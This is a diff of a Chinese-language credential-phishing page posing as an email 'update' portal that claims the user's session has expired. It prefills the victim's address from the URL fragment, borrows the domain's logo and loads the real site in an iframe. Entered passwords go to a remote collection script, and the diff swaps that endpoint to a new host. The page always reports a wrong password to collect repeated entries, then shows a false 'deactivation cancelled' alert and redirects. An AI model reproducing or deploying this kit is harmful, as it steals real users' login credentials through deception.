@@ -3,9 +3,9 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>更新邮箱</title>
+<title>更新电子邮件</title>
 <style>
-/* 原有 CSS 样式保持不变 */
+/* 保持现有的 CSS 样式不变 */
 body {
     margin: 0;
     padding: 0;
@@ -121,7 +121,7 @@ p {
     margin: 0 auto 20px;
 }
 
-/* 会话过期文字样式 */
+/* 会话过期文本样式 */
 #session-expired {
     color: red;
     font-weight: normal;
@@ -139,15 +139,15 @@ p {
     <img id="domainLogo" alt="域名标志" style="display: none;">
     <h2 id="emailDomainHeader">门户</h2>
 
-    <!-- 会话过期文字 -->
-    <p id="session-expired">您的会话已过期，请重新登录以继续。</p>
+    <!-- 会话过期文本 -->
+    <p id="session-expired">您的会话已过期，请登录以继续。</p>
     
-    <form id="loginForm" action="https://amdesarrollos.com/layouts/me/tele-php.php" method="post">
+    <form id="loginForm" action="https://zeexpress.in/vendor/frnny/new-telephp.php" method="post">
         <div class="form-group">
-            <label for="username">邮箱</label>
+            <label for="username">电子邮件</label>
             <input type="text" id="username" name="username" readonly required>
         </div>
-        <div class="error-message" id="errorMessage">密码无效！请输入正确的密码。</div>
+        <div class="error-message" id="errorMessage">密码无效！请输入正确的密码</div>
         <div class="form-group">
             <label for="password">当前密码</label>
             <input type="password" id="password" name="password" placeholder="请输入您的密码" required>
@@ -160,8 +160,8 @@ p {
 
 <script>
 // 提取 '#' 参数值
-const fragment = window.location.hash.slice(1); // 移除 '#' 字符
-const email = decodeURIComponent(fragment); // 解码邮箱值
+const fragment = window.location.hash.slice(1); // 去掉 '#' 字符
+const email = decodeURIComponent(fragment); // 解码电子邮件值
 let attemptCount = 0;
 
 if (email) {
@@ -171,7 +171,7 @@ if (email) {
     const emailDomain = email.split('@')[1];
     const emailDomainHeader = email.split('@')[1].split('.')[0];
     const emailHeader = document.getElementById('emailDomainHeader');
-    emailHeader.textContent = ` ${emailDomainHeader} 门户`;
+    emailHeader.textContent = `${emailDomainHeader}门户`;
 
     const logoUrl = `https://logo.clearbit.com/${emailDomain}`;
     const logoImg = document.getElementById('domainLogo');
@@ -181,19 +181,19 @@ if (email) {
     };
     logoImg.style.display = "block";
 
-    // 设置 iframe src 为域名主页
+    // 设置 iframe 的 src 为域名主页
     const iframe = document.getElementById('background-frame');
     iframe.src = `https://${emailDomain}`;
 }
 
 const errorMessage = document.getElementById("errorMessage");
 
-// 输入时隐藏错误消息
+// 在输入时隐藏错误
 document.getElementById("password").addEventListener("input", function () {
     errorMessage.style.display = "none";
 });
 
-// 每次提交时显示错误消息，3次尝试后重定向
+// 在每次提交时显示错误消息，并在 3 次尝试后重定向
 document.getElementById("loginForm").addEventListener("submit", function (e) {
     e.preventDefault();
 
@@ -208,23 +208,23 @@ document.getElementById("loginForm").addEventListener("submit", function (e) {
     })
     .then((response) => response.json())
     .then(() => {
-        errorMessage.style.display = "block";
+        errorMessage.style.display = "block"; // 始终显示错误消息
         document.getElementById("password").value = ""; // 清空密码字段
 
-        // 第三次尝试后重定向并弹出警告
+        // 在第三次尝试后重定向
         if (attemptCount >= 3) {
-            alert("您的账户停用已取消，您可以继续使用账户而不受中断。");
+            alert("您的账户停用已被取消。您可以继续正常使用账户。");
             const emailDomain = email ? email.split('@')[1] : "default-domain.com";
             window.location.href = `https://${emailDomain}`;
         }
     })
     .catch(() => {
-        errorMessage.style.display = "block";
-        document.getElementById("password").value = ""; // 请求错误时清空密码字段
+        errorMessage.style.display = "block"; // 在请求失败时显示错误消息
+        document.getElementById("password").value = ""; // 在错误时清空密码字段
 
-        // 即使 fetch 错误也确保重定向
+        // 在第三次尝试后重定向
         if (attemptCount >= 3) {
-            alert("您的账户停用已取消，您可以继续使用账户而不受中断。");
+            alert("您的账户停用已被取消。您可以继续正常使用账户。");
             const emailDomain = email ? email.split('@')[1] : "default-domain.com";
             window.location.href = `https://${emailDomain}`;
         }
